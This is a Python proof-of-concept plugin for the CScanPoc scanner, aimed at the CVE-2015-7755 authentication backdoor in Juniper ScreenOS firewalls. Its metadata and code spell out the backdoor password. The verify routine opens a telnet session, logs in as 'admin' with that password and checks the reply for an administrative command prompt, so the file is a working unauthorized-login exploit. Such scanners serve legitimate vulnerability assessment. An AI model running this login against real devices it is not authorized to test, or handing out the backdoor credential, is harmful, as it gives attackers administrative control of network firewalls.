# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
import telnetlib

class Vuln(ABVuln):
    vuln_id = 'Juniper_0001'  # 平台漏洞编号，留空
    name = 'Juniper ScreenOS认证后门'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-10-08'  # 漏洞公布时间
    desc = '''
        2015年12月18日Juniper网络发布声明（advisory）示，他们已经发现了ScreenOS中的未经授权的代码，ScreenOS软件管理Netscreen防火墙。
        此声明涉及两个不同的问题;一个通过VPN实现的后门使恶意窃听者破解流量，以及另一个后门在SSH和Telnet防护进程中允许攻击者绕过身份验证。
        不久后，Juniper网络发布了这个声明，FoxIT的一名员工表示，他们能够在6小时之内破解后门密码。

        <<< %s(un='%s') = %u 后门密码
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7755'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-7755'  # cve编号
    product = 'Juniper'  # 漏洞应用名称
    product_version = '6.2.0r15到6.2.0r18和6.3.0r12到6.3.0r20'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8eab28d4-3a14-47d5-af45-09c6ad4577e7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            port = 23
            time = 5
            user = 'admin'
            password = '<<< %s(un=\'%s\') = %u'
            finish = '->'
            try:
                t = telnetlib.Telnet(arg,port, timeout=time)
                t.write(user + '\n')
                t.read_until('password: ')  
                t.write(password + '\n')
                str1 =  t.read_until(finish)
                t.write("?\n")
                str = t.read_until(finish)
                t.close()
                if ('->' in str) and ('exec' in str):
                    #security_hole(arg)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            except Exception, e:
                pass

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
